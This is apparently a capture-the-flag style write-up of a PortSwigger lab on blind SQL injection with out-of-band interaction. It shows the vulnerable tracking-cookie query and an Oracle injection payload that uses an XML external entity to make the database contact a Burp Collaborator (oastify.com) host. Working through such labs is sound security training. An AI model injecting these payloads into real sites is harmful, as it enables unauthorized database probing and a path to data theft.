## Question:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/fc896581-2e92-4aa9-b6be-eb2c2c0b5a6a)

## Solution:

The payloads for each domain to perform a DNS lookup to an external domain.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/62e77cbb-65bd-47e8-863e-3f4371c8ed79)

Query made -

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'`

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/b47a5684-105b-4c94-b0ad-269843e6cffc)

Then click on copy to clipbord option = `t828uox8ju7ieb53eurz8unel5rwfm3b.oastify.com` we need paste it in the payload which we are going to do.

Since we are unsure of the database we are working with, we attempt every payload listed on DNS lookup for every database.

So the first one will be Oracle

For that the payload is

`SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--`

Then query will be changed by pasting the external domain provided by collaborator would look like this

`SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://in9x9dcxyjm7t0kstj6onj230u6luci1.oastify.com/"> %remote;]>'),'/l') FROM dual)--`
